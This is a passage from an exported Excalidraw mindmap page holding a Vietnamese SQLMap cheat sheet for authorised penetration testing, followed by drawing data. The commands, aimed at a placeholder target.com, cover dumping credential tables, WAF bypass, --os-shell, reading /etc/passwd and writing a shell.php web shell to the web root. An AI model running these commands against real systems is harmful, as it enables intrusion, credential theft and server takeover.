---
title: "sql map template"
tags:
  - excalidraw
  - mindmap
---


<div class="excalidraw-container" id="ex-j6dw9k">
  <div class="excalidraw-toolbar">
    <div class="excalidraw-badge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
      <span>Excalidraw Mindmap</span>
    </div>
    <div class="excalidraw-controls">
      <button type="button" class="excalidraw-btn zoom-in" title="Phóng to">🔍+</button>
      <button type="button" class="excalidraw-btn zoom-out" title="Thu nhỏ">🔍-</button>
      <button type="button" class="excalidraw-btn zoom-reset" title="Vừa màn hình">↺</button>
      <button type="button" class="excalidraw-btn fullscreen" title="Toàn màn hình">⛶</button>
    </div>
  </div>
  <div class="excalidraw-viewport">
    <div class="excalidraw-canvas-wrapper">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1709 3557" class="excalidraw-svg" data-width="1709" data-height="3557">
<g transform="translate(422.95,-746.87)">

<rect x="-382.9548034667969" y="962.0431518554681" width="801.4813975075078" height="3301.3400421142587" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="-382.9548034667969" y="962.0431518554681" width="801.4813975075078" height="3301.3400421142587" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">1. SQL Injection cơ bản với tham số GET</span>
      </div>
      <a href="#doc-b104a7903aa064e9b1dea4c62844ea6c8d5e4fd6" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Dưới đây là tổng hợp các <strong>template sử dụng SQLMap</strong> cho nhiều tình huống tấn công SQL injection phổ biến. Các lệnh được phân loại theo mục đích và dạng request, giúp bạn dễ dàng áp dụng khi pentest hợp pháp.</p>
<hr>
<h2>1. SQL Injection cơ bản với tham số GET</h2>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch
</code></pre>
<ul>
<li><code>-u</code> : URL chứa tham số cần test.</li>
<li><code>--batch</code> : tự động chọn các lựa chọn mặc định, không hỏi.</li>
</ul>
<p><strong>Thêm chỉ định DBMS nếu biết trước:</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbms=mysql --batch
</code></pre>
<p><strong>Tăng mức độ test (level, risk):</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --level=5 --risk=3 --batch
</code></pre>
<hr>
<h2>2. POST form (dữ liệu gửi qua POST)</h2>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/login.php&quot; --data=&quot;username=admin&amp;password=pass&quot; --batch
</code></pre>
<ul>
<li><code>--data</code> : chuỗi dữ liệu POST, SQLMap sẽ tự test tất cả các tham số.</li>
</ul>
<p><strong>Chỉ test một tham số cụ thể:</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/login.php&quot; --data=&quot;username=admin&amp;password=pass&quot; -p username --batch
</code></pre>
<ul>
<li><code>-p</code> : chỉ định tham số cần test.</li>
</ul>
<p><strong>Dùng method POST với content-type JSON:</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/api/login&quot; --data=&#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;pass&quot;}&#39; --batch
</code></pre>
<hr>
<h2>3. Kèm theo Cookie (session, xác thực)</h2>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --cookie=&quot;PHPSESSID=2kg9pgcnd306oi1v39k6ismlnt&quot; --batch
</code></pre>
<p><strong>Nếu có nhiều header cần thêm:</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --cookie=&quot;PHPSESSID=abc; token=xyz&quot; --batch
</code></pre>
<p><strong>Dùng file cookie (định dạng Netscape):</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --cookie-file=/path/to/cookies.txt --batch
</code></pre>
<hr>
<h2>4. Sử dụng request từ file (Burp capture)</h2>
<pre><code class="language-bash">sqlmap -r request.txt --batch
</code></pre>
<ul>
<li><code>request.txt</code> là file chứa raw HTTP request (có thể lưu từ Burp Suite, Fiddler).</li>
<li>SQLMap sẽ tự động parse URL, method, headers, cookie, data và test tất cả các tham số.</li>
</ul>
<p><strong>Chỉ test tham số cụ thể trong file:</strong></p>
<pre><code class="language-bash">sqlmap -r request.txt -p username --batch
</code></pre>
<hr>
<h2>5. Lấy dữ liệu sau khi xác nhận injection</h2>
<p>Sau khi phát hiện lỗi, bạn có thể dùng các lệnh sau:</p>
<h3>Lấy danh sách databases</h3>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbs --batch
</code></pre>
<h3>Lấy bảng của một database</h3>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname --tables --batch
</code></pre>
<h3>Lấy dữ liệu từ bảng</h3>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T users --dump --batch
</code></pre>
<ul>
<li><code>--dump</code> : lấy toàn bộ dữ liệu trong bảng.</li>
<li>Có thể thêm <code>--columns</code> để xem các cột trước.</li>
</ul>
<h3>Lấy dữ liệu từ một cột cụ thể</h3>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T users -C username,password --dump --batch
</code></pre>
<hr>
<h2>6. Blind SQL Injection (time-based hoặc boolean-based)</h2>
<p>Nếu ứng dụng không hiển thị lỗi, cần dùng kỹ thuật blind.</p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --technique=B --batch
</code></pre>
<ul>
<li><code>--technique</code> : chỉ định kỹ thuật (B: boolean-based blind, T: time-based, E: error-based, U: union query, S: stacked queries).</li>
<li>Ví dụ chỉ dùng time-based:</li>
</ul>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --technique=T --time-sec=5 --batch
</code></pre>
<ul>
<li><code>--time-sec</code> : số giây delay để xác nhận time-based.</li>
</ul>
<hr>
<h2>7. Bypass WAF (Web Application Firewall)</h2>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --tamper=space2comment --batch
</code></pre>
<ul>
<li><code>--tamper</code> : dùng các script biến đổi payload để bypass WAF. Một số script phổ biến: <code>between</code>, <code>randomcase</code>, <code>space2comment</code>, <code>charencode</code>, <code>versionedmorekeywords</code>.</li>
</ul>
<p>Kết hợp nhiều tamper:</p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --tamper=between,randomcase,space2comment --batch
</code></pre>
<p>Xem danh sách tamper có sẵn:</p>
<pre><code class="language-bash">sqlmap --list-tampers
</code></pre>
<hr>
<h2>8. Tấn công SQL injection nâng cao</h2>
<h3>Lấy shell hệ điều hành (nếu DBMS cho phép)</h3>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-shell --batch
</code></pre>
<h3>Đọc file từ server (MySQL, PostgreSQL)</h3>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-read=&quot;/etc/passwd&quot; --batch
</code></pre>
<h3>Ghi file lên server (MySQL)</h3>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-write=&quot;/local/file.php&quot; --file-dest=&quot;/var/www/html/shell.php&quot; --batch
</code></pre>
<hr>
<h2>9. Lưu phiên làm việc (session)</h2>
<p>SQLMap có thể lưu lại tiến trình để dùng sau:</p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch -s sqlmap_session.sqlite
</code></pre>
<ul>
<li><code>-s</code> : chỉ định file lưu session (thường dùng khi tấn công dài, cần resume).</li>
</ul>
<p>Resume lại phiên trước:</p>
<pre><code class="language-bash">sqlmap --resume=sqlmap_session.sqlite
</code></pre>
<hr>
<h2>10. Tùy chọn hữu ích khác</h2>
<ul>
<li><p><strong>Ẩn thông tin không cần thiết (chỉ hiển thị kết quả quan trọng):</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch --quiet
</code></pre>
</li>
<li><p><strong>Tăng tốc bằng multi-threading (cẩn thận bị chặn):</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --threads=10 --batch
</code></pre>
</li>
<li><p><strong>Theo dõi request/response (debug):</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -v 3 --batch
</code></pre>
</li>
<li><p><strong>Sử dụng proxy (Burp) để phân tích:</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot; --batch
</code></pre>
</li>
<li><p><strong>Chỉ phát hiện, không khai thác dữ liệu:</strong></p>
<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch --banner
</code></pre>
</li>
</ul>
<hr>
<h2>⚠️ Lưu ý pháp lý</h2>
<ul>
<li><strong>Chỉ sử dụng SQLMap trên các hệ thống bạn có quyền kiểm tra rõ ràng.</strong></li>
<li>Việc tấn công hệ thống không được phép là vi phạm pháp luật và đạo đức nghề nghiệp.</li>
<li>Trong môi trường thực tế, nên có sự đồng ý bằng văn bản của chủ sở hữu hệ thống.</li>
</ul>
<hr>
<p>Hy vọng các template trên giúp bạn sử dụng SQLMap hiệu quả trong các cuộc kiểm thử bảo mật hợp pháp. Nếu cần chi tiết hơn về một tùy chọn, hãy dùng <code>sqlmap -hh</code> hoặc tham khảo tài liệu chính thức.</p>

    </div>
  </div>
</foreignObject>

</g>
<a href="./sql-map-template_md" class="excalidraw-node-link" target="_self" title="sql map template_md"><g transform="translate(422.95,-746.87)">
<text x="-69.58" y="806.87" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#1e1e1e" text-anchor="start"><tspan x="-69.58" dy="0">📍sql map template_md</tspan></text>
</g></a>
<g transform="translate(422.95,-746.87)">
<path d="M-120.51 1027.96 L-120.92 1028.75 L-120.92 1028.75" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-138.76 1037.73 L-140.06 1037.33 L-141.13 1036.93 L-142.25 1036.47 L-144.51 1035.28 L-146.64 1034.16 L-149.31 1033.10 L-152.80 1031.85 L-154.70 1031.32 L-160.98 1029.61 L-165.37 1028.49 L-169.81 1027.63 L-174.31 1027.03 L-178.58 1026.70 L-182.73 1026.64 L-187.05 1026.90 L-191.32 1027.56 L-193.39 1027.96 L-197.48 1029.01 L-201.39 1030.33 L-205.13 1031.85 L-210.22 1034.76 L-213.19 1036.93 L-215.56 1039.37 L-217.39 1041.82 L-218.58 1044.26 L-218.99 1045.44 L-219.11 1048.09 L-218.52 1050.79 L-216.92 1053.56 L-214.25 1056.40 L-210.22 1058.98 L-205.19 1061.29 L-194.58 1063.93 L-185.99 1064.98 L-181.54 1065.38 L-172.36 1065.77 L-163.35 1065.84 L-154.46 1065.51 L-146.58 1064.92 L-139.23 1063.93 L-132.89 1062.74 L-127.14 1061.29 L-122.05 1059.64 L-117.96 1058.12 L-114.46 1056.40 L-111.50 1054.56 L-109.31 1052.71 L-107.77 1050.73 L-107.17 1048.55 L-107.17 1046.24 L-108.12 1043.47 L-109.72 1040.30 L-111.79 1037.26 L-112.98 1035.81 L-115.65 1033.10 L-120.27 1030.13 L-123.94 1029.01 L-128.15 1028.62 L-130.64 1028.68 L-130.64 1028.68" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-328.69 1114.16 L-329.31 1113.53 L-329.98 1113.10 L-330.77 1112.59 L-331.50 1112.03 L-332.34 1111.66 L-333.40 1111.22 L-334.36 1110.97 L-335.48 1110.78 L-336.72 1110.66 L-339.24 1110.66 L-340.42 1110.78 L-342.39 1110.84 L-344.01 1110.97 L-345.36 1111.22 L-346.43 1111.41 L-348.23 1111.78 L-349.68 1112.10 L-350.98 1112.59 L-352.10 1112.97 L-354.34 1113.85 L-355.69 1114.41 L-356.87 1114.85 L-357.83 1115.29 L-358.67 1115.72 L-359.40 1116.10 L-360.41 1116.72 L-361.25 1117.22 L-361.98 1117.78 L-363.44 1119.10 L-364.45 1120.16 L-365.29 1121.16 L-366.08 1122.10 L-366.64 1122.91 L-367.20 1123.66 L-367.65 1124.41 L-368.27 1125.47 L-368.60 1126.47 L-369.00 1127.60 L-369.28 1128.60 L-369.45 1129.92 L-369.50 1131.23 L-369.45 1132.54 L-369.28 1133.79 L-368.77 1136.73 L-368.04 1139.30 L-367.65 1140.04 L-366.53 1142.42 L-365.97 1143.42 L-365.40 1144.23 L-364.34 1145.61 L-363.50 1146.67 L-362.71 1147.55 L-361.98 1148.30 L-361.36 1149.05 L-360.69 1149.67 L-359.40 1150.86 L-358.84 1151.43 L-357.77 1152.30 L-355.86 1153.67 L-354.96 1154.30 L-352.94 1155.49 L-352.15 1155.93 L-350.86 1156.55 L-349.68 1157.05 L-347.66 1157.80 L-345.81 1158.49 L-344.24 1158.86 L-342.84 1159.24 L-341.10 1159.68 L-340.03 1159.93 L-338.23 1160.24 L-336.60 1160.49 L-335.14 1160.68 L-332.56 1160.93 L-331.50 1160.99 L-329.59 1161.05 L-327.96 1161.05 L-326.50 1161.05 L-325.21 1160.99 L-324.08 1160.99 L-322.96 1160.93 L-321.56 1160.74 L-318.92 1160.68 L-316.73 1160.37 L-315.72 1160.24 L-313.98 1160.12 L-312.58 1159.87 L-311.28 1159.68 L-310.16 1159.61 L-309.15 1159.49 L-307.80 1159.43 L-306.57 1159.24 L-305.45 1159.18 L-304.32 1159.05 L-303.26 1158.86 L-302.13 1158.68 L-301.01 1158.43 L-299.89 1158.12 L-298.09 1157.55 L-296.69 1156.99 L-295.51 1156.55 L-294.50 1156.11 L-293.60 1155.61 L-292.87 1155.24 L-292.20 1154.80 L-291.30 1154.11 L-290.51 1153.55 L-289.78 1152.86 L-289.11 1152.11 L-288.44 1151.24 L-287.87 1150.36 L-287.43 1149.36 L-287.03 1148.42 L-286.81 1147.36 L-286.75 1146.11 L-286.81 1144.92 L-287.03 1143.49 L-287.87 1140.54 L-288.55 1138.67 L-289.45 1136.92 L-290.34 1135.42 L-291.41 1133.98 L-291.97 1133.23 L-293.26 1131.85 L-294.67 1130.66 L-296.13 1129.48 L-297.70 1128.41 L-299.44 1127.35 L-301.29 1126.29 L-304.32 1124.66 L-306.46 1123.60 L-307.52 1123.04 L-309.60 1121.91 L-311.90 1120.72 L-314.20 1119.53 L-316.56 1118.35 L-319.14 1117.16 L-321.61 1116.03 L-324.65 1114.85 L-327.40 1113.72 L-330.04 1112.72 L-332.73 1111.91 L-335.14 1111.16 L-337.56 1110.47 L-339.86 1109.91 L-340.93 1109.78 L-342.72 1109.53 L-345.59 1109.78 L-345.59 1109.78" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M0.18 1296.49 L-0.77 1296.61 L-1.61 1296.92 L-2.57 1297.17 L-3.52 1297.42 L-4.42 1297.80 L-5.26 1298.17 L-6.05 1298.42 L-6.89 1298.80 L-7.73 1299.17 L-6.61 1299.42 L-5.49 1299.36 L-3.35 1299.11 L-1.11 1298.99 L1.02 1298.73 L2.09 1298.67 L3.89 1298.42 L5.57 1298.36 L6.92 1298.30 L8.27 1298.24 L9.39 1298.17 L10.51 1298.05 L12.93 1297.99 L15.23 1297.80 L17.87 1297.49 L19.21 1297.30 L20.34 1297.24 L21.40 1297.17 L22.53 1297.17 L23.76 1297.11 L24.77 1296.98 L25.84 1296.92 L26.96 1296.98 L26.96 1296.98" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-71.79 1305.93 L-72.91 1305.86 L-73.98 1305.74 L-73.53 1305.11 L-70.67 1304.55 L-68.31 1304.18 L-65.84 1303.86 L-63.31 1303.67 L-60.79 1303.43 L-58.26 1303.30 L-57.25 1303.18 L-54.95 1303.11 L-52.98 1303.11 L-51.24 1303.18 L-48.49 1303.43 L-47.26 1303.49 L-46.19 1303.67 L-45.18 1303.74 L-43.78 1303.86 L-42.43 1303.92 L-41.03 1303.92 L-39.57 1304.05 L-38.16 1304.05 L-36.87 1304.05 L-35.75 1304.05 L-34.34 1304.05 L-33.17 1304.05 L-32.04 1304.05 L-32.04 1304.05" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<text x="219.86" y="1141.28" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#1e1e1e" text-anchor="start"><tspan x="219.86" dy="0">-u</tspan><tspan x="219.86" dy="25">-batch</tspan></text>
</g>
<g transform="translate(422.95,-746.87)">
<text x="235.49" y="1269.15" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#1e1e1e" text-anchor="start"><tspan x="235.49" dy="0">--level</tspan><tspan x="235.49" dy="25">--risk </tspan></text>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-251.83 1154.86 L-251.21 1154.30 L-250.32 1153.98 L-249.14 1154.11 L-248.07 1154.30 L-247.06 1154.49 L-245.88 1154.61 L-243.75 1154.73 L-241.33 1154.92 L-240.21 1154.98 L-238.36 1155.05 L-236.62 1155.11 L-235.10 1155.30 L-232.07 1155.49 L-229.94 1155.73 L-227.75 1155.99 L-225.50 1156.36 L-223.14 1156.55 L-220.84 1156.86 L-219.61 1157.05 L-217.19 1157.24 L-214.78 1157.49 L-212.42 1157.67 L-210.18 1157.80 L-209.11 1157.86 L-205.80 1157.92 L-203.83 1157.99 L-200.52 1157.99 L-197.15 1157.99 L-195.19 1157.99 L-193.00 1157.92 L-190.58 1157.92 L-188.06 1157.80 L-185.81 1157.61 L-183.85 1157.55 L-182.16 1157.42 L-180.70 1157.30 L-178.74 1157.24 L-176.77 1157.17 L-175.03 1157.11 L-173.57 1157.05 L-172.23 1156.92 L-170.93 1156.86 L-169.81 1156.86 L-167.45 1156.73 L-165.71 1156.67 L-162.79 1156.67 L-161.50 1156.67 L-160.38 1156.67 L-158.70 1156.67 L-156.39 1156.80 L-153.98 1156.73 L-152.01 1156.73 L-148.59 1156.55 L-146.12 1156.42 L-143.71 1156.36 L-140.28 1156.17 L-138.48 1156.17 L-136.91 1156.17 L-135.45 1156.17 L-134.11 1156.17 L-132.93 1156.17 L-131.80 1156.17 L-128.77 1156.17 L-126.86 1156.17 L-125.35 1156.11 L-124.11 1156.11 L-122.88 1156.11 L-121.42 1156.11 L-120.07 1156.11 L-118.78 1156.11 L-117.43 1156.11 L-114.12 1156.30 L-112.32 1156.36 L-110.64 1156.42 L-108.00 1156.49 L-106.93 1156.55 L-105.53 1156.67 L-104.24 1156.67 L-102.95 1156.73 L-101.60 1156.73 L-98.68 1156.92 L-96.72 1157.05 L-94.53 1157.11 L-90.93 1157.24 L-88.69 1157.42 L-86.89 1157.49 L-85.21 1157.61 L-83.35 1157.86 L-82.23 1157.99 L-81.17 1158.17 L-78.30 1158.55 L-77.29 1158.67 L-75.55 1158.99 L-72.91 1159.36 L-70.72 1159.67 L-67.47 1160.11 L-65.39 1160.43 L-63.65 1160.61 L-62.08 1160.74 L-60.79 1160.86 L-59.55 1160.92 L-58.43 1161.11 L-57.03 1161.24 L-55.73 1161.43 L-54.61 1161.55 L-53.54 1161.67 L-52.42 1161.86 L-51.35 1161.99 L-50.29 1162.18 L-49.28 1162.30 L-48.15 1162.55 L-48.15 1162.55" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-18.91 1156.73 L-19.52 1156.17 L-18.79 1155.67 L-15.43 1155.42 L-12.34 1155.30 L-8.91 1155.36 L-7.12 1155.42 L-3.13 1155.67 L1.02 1155.99 L5.12 1156.36 L11.13 1156.92 L15.06 1157.30 L18.82 1157.61 L22.30 1157.92 L25.50 1158.17 L26.90 1158.30 L29.71 1158.61 L32.13 1158.86 L33.19 1158.92 L34.93 1159.05 L36.28 1159.24 L37.35 1159.30 L38.58 1159.43 L39.59 1159.61 L40.77 1159.74 L40.77 1159.74" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M6.47 1056.25 L6.02 1056.94 L6.13 1058.07 L6.92 1058.51 L8.55 1059.19 L10.62 1059.88 L12.93 1060.57 L15.51 1061.13 L19.83 1062.01 L21.18 1062.26 L24.10 1062.76 L26.85 1063.13 L29.54 1063.44 L32.13 1063.70 L34.60 1063.88 L35.72 1063.88 L37.63 1063.94 L39.20 1063.94 L40.66 1063.94 L41.95 1063.82 L44.20 1063.63 L45.82 1063.44 L47.23 1063.13 L48.41 1062.94 L49.42 1062.76 L50.32 1062.51 L51.44 1062.19 L52.50 1061.88 L53.40 1061.51 L55.26 1060.57 L56.43 1059.69 L57.33 1058.88 L58.74 1056.94 L59.63 1055.25 L60.20 1053.82 L60.48 1052.38 L60.65 1051.19 L60.65 1050.00 L60.08 1047.38 L59.19 1045.31 L57.95 1043.44 L55.42 1040.81 L53.40 1039.31 L52.11 1038.43 L49.47 1036.99 L46.55 1035.74 L43.75 1034.74 L40.55 1033.99 L37.46 1033.37 L34.37 1032.87 L31.23 1032.56 L28.03 1032.37 L26.46 1032.37 L22.08 1032.37 L19.27 1032.56 L16.86 1032.87 L14.44 1033.37 L12.42 1034.24 L10.62 1035.18 L9.05 1036.31 L7.76 1037.69 L6.64 1039.18 L6.13 1040.12 L5.63 1041.69 L5.23 1043.19 L5.01 1044.63 L5.12 1047.87 L5.63 1050.50 L6.64 1053.06 L8.04 1055.57 L8.94 1056.88 L8.94 1056.88" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<text x="327.59" y="1489.49" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20.300318667763165" fill="#1e1e1e" text-anchor="start"><tspan x="327.59" dy="0">--data : Body Post</tspan></text>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-348.03 1433.98 L-347.23 1434.22 L-346.37 1434.46 L-345.36 1434.69 L-344.19 1434.81 L-341.95 1435.23 L-339.65 1435.58 L-338.48 1435.76 L-336.08 1435.94 L-333.63 1436.24 L-331.12 1436.48 L-328.56 1436.59 L-325.95 1436.77 L-323.28 1436.77 L-320.77 1436.77 L-316.99 1436.42 L-315.76 1436.24 L-313.47 1435.88 L-311.17 1435.41 L-309.09 1434.81 L-307.12 1434.16 L-305.31 1433.39 L-303.60 1432.50 L-302.00 1431.66 L-301.31 1431.19 L-299.49 1429.70 L-297.73 1427.80 L-297.04 1427.03 L-296.56 1426.14 L-296.13 1425.43 L-295.76 1424.65 L-295.44 1423.59 L-295.12 1422.52 L-294.96 1421.33 L-295.33 1418.42 L-296.29 1415.74 L-297.31 1414.26 L-298.64 1412.89 L-300.24 1411.82 L-302.11 1410.87 L-303.17 1410.46 L-305.52 1409.80 L-308.08 1409.39 L-310.96 1409.15 L-314.05 1409.09 L-317.63 1409.33 L-323.39 1409.86 L-327.23 1410.46 L-331.07 1411.11 L-332.83 1411.53 L-336.40 1412.30 L-339.65 1413.13 L-342.59 1413.90 L-345.15 1414.73 L-347.55 1415.63 L-349.68 1416.64 L-351.55 1417.70 L-353.15 1418.83 L-354.48 1420.08 L-355.55 1421.33 L-356.35 1422.40 L-356.93 1423.41 L-357.31 1424.36 L-357.57 1425.55 L-357.73 1426.73 L-357.52 1427.80 L-356.99 1428.93 L-355.12 1431.25 L-354.21 1431.96 L-350.85 1433.62 L-348.03 1434.34 L-346.59 1434.57 L-346.59 1434.57" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-339.87 1521.18 L-341.73 1520.71 L-342.59 1520.53 L-345.09 1519.93 L-346.05 1519.81 L-347.33 1519.87 L-348.40 1520.23 L-349.20 1520.71 L-350.53 1521.89 L-351.71 1523.32 L-352.72 1524.98 L-353.41 1526.82 L-354.21 1529.97 L-354.32 1531.75 L-354.32 1533.36 L-354.11 1535.08 L-353.79 1535.97 L-353.04 1537.75 L-351.92 1539.36 L-350.53 1540.72 L-348.83 1541.79 L-346.91 1542.68 L-344.67 1543.16 L-342.16 1543.46 L-338.27 1543.22 L-336.99 1543.04 L-334.48 1542.57 L-332.13 1541.85 L-329.89 1541.14 L-327.87 1540.19 L-326.05 1539.12 L-324.45 1537.93 L-323.07 1536.57 L-321.95 1534.96 L-321.09 1533.12 L-320.77 1532.11 L-320.35 1528.72 L-320.51 1526.59 L-321.09 1524.21 L-322.00 1522.07 L-323.28 1520.17 L-324.93 1518.63 L-327.17 1517.50 L-329.68 1516.73 L-330.91 1516.49 L-330.91 1516.49" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-228.03 1430.18 L-226.69 1430.18 L-225.68 1430.00 L-223.23 1429.82 L-220.51 1429.53 L-217.73 1429.23 L-214.85 1428.99 L-211.97 1428.93 L-209.31 1428.81 L-207.97 1428.81 L-205.36 1428.81 L-202.80 1428.81 L-199.07 1428.93 L-196.56 1429.11 L-194.05 1429.17 L-191.55 1429.23 L-189.09 1429.29 L-186.59 1429.23 L-185.36 1429.23 L-183.01 1429.17 L-181.95 1429.17 L-180.08 1429.11 L-178.43 1428.99 L-176.93 1428.99 L-173.36 1428.93 L-171.55 1428.87 L-170.05 1428.87 L-168.77 1428.93 L-167.60 1428.87 L-166.11 1428.87 L-164.88 1428.87 L-163.71 1428.87 L-162.64 1428.81 L-161.57 1428.69 L-160.51 1428.63 L-159.12 1428.63 L-158.16 1428.57 L-156.83 1428.57 L-156.83 1428.57" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-179.87 1547.08 L-179.01 1547.32 L-177.36 1547.44 L-174.85 1547.61 L-170.59 1547.44 L-167.55 1547.32 L-164.24 1547.08 L-160.51 1546.72 L-156.77 1546.43 L-152.99 1546.19 L-149.25 1545.89 L-145.95 1545.65 L-142.85 1545.54 L-139.87 1545.30 L-138.43 1545.24 L-135.71 1545.00 L-132.13 1544.94 L-130.32 1544.94 L-128.72 1544.88 L-127.39 1544.88 L-126.32 1544.88 L-124.93 1544.82 L-123.87 1544.82 L-122.75 1544.82 L-121.57 1544.88 L-121.57 1544.88" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M1.57 1513.22 L1.09 1512.57 L0.88 1513.40 L0.72 1514.47 L0.24 1518.21 L-0.08 1520.59 L-0.45 1522.78 L-0.56 1523.85 L-0.88 1525.75 L-0.99 1527.18 L-1.20 1528.31 L-1.31 1529.38 L-1.41 1530.57 L-1.57 1531.69 L-1.63 1532.70 L-1.57 1533.71 L-0.99 1534.37 L-0.08 1534.72 L0.88 1534.84 L2.11 1534.84 L3.39 1534.78 L6.16 1534.61 L7.33 1534.49 L9.20 1534.25 L10.69 1534.07 L12.13 1533.89 L14.27 1533.42 L15.87 1533.06 L17.04 1532.65 L17.95 1532.17 L17.95 1532.17" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M13.68 1523.44 L14.91 1523.62 L15.65 1524.03 L16.40 1524.69 L17.57 1525.93 L18.27 1527.06 L18.80 1528.01 L18.91 1529.14 L18.69 1530.09 L17.84 1532.17 L16.29 1534.25 L14.11 1536.51 L11.60 1538.29 L10.37 1539.06 L10.37 1539.06" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<text x="34.99" y="1542.00" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#1e1e1e" text-anchor="start"><tspan x="34.99" dy="0">Body Post bình thường</tspan></text>
</g>
<g transform="translate(422.95,-746.87)">
